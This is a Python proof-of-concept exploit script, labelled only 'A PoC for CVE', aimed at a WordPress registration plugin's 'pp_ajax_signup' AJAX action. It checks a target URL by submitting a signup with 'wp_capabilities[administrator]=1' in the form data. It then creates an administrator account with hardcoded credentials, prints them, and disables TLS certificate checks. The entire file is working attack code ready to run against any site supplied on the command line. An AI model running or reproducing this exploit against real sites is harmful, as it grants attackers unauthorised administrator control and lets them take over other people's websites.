#!/bin/python3

import requests
from colorama import Fore as color
import random
import string
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

B = color.BLUE
G = color.GREEN
W = color.WHITE
R = color.RED
Y = color.YELLOW
C = color.CYAN

parser = argparse.ArgumentParser(description="A PoC for CVE")
parser.add_argument("url", help="Target URL to exploit")
args = parser.parse_args()
url = args.url
full_url = url + "/wp-admin/admin-ajax.php"

user_agent = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Content-Type": "application/x-www-form-urlencoded"
}

check_headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Origin": url,
    "Referer": url,
}

def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

check_payload = {
        "reg_username": generate_random_string(),
        "reg_email": generate_random_string() + "@example.com",
        "reg_password": generate_random_string(),
        "reg_password_present": "true",
        "reg_first_name": generate_random_string(),
        "reg_last_name": generate_random_string(),
        "_wp_http_referer": "/wp/?page_id=18",
        "pp_current_url": url,
        "wp_capabilities[administrator]": "1",
        "signup_form_id": "1",
        "signup_referrer_page": "",
        "action": "pp_ajax_signup",
        "melange_id": "",
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

data = {
        "reg_username": "smexyusername",
        "reg_email": "smexyemail@gmail.com",
        "reg_password": "smexypassword",
        "reg_password_present": "true",
        "wp_capabilities[administrator]": "1",
        "reg_first_name": "smexy",
        "reg_last_name": "smexy",
        "action": "pp_ajax_signup"
}

try:
    print(f"{B}[*] {W}Checking if {R}{url} {W}is vulnerable")
    send_request = requests.post(full_url, headers={**check_headers, **user_agent}, data=check_payload)
    check_vuln = send_request.text
    if "Registration successful." in check_vuln:
        print(f"{G}[+] {W}The target {R}{url} {W}is vulnerable")
        print(f"{B}[*] {W}Launching exploit against {R}{url}")
        print(f"{B}[*] {W}Creating a new WordPress account")
        exploit_status = requests.post(full_url, headers=headers, data=data, verify=False).text
        if "Registration successful." in exploit_status:
            print(f"{G}[+] {W}Exploit was successful")
            print(f"{G}[+] {W}New credentials added")
            print(f"{C}-" * 40)
            print(f"{G}[+] {W}Your username{B}: {G}smexyusername")
            print(f"{G}[+] {W}Your password{B}: {G}smexypassword")
            print(f"{C}-" * 40)
        elif "Sorry, that username already exists!" in exploit_status:
            print(f"{Y}[!] {W}The WordPress credentials already exists on {R}{url}")
            print(f"{C}-" * 40)
            print(f"{G}[+] {W}Your username{B}: {G}smexyusername")
            print(f"{G}[+] {W}Your password{B}: {G}smexypassword")
            print(f"{C}-" * 40)
    else:
        print(f"{R}[~] {W}The target {R}{url} {W}is not vulnerable")
except Exception:
    print(f"{Y}[!] {W}Uh oh! Connection timedout, or target is not vulnerable, try again later")
    exit()
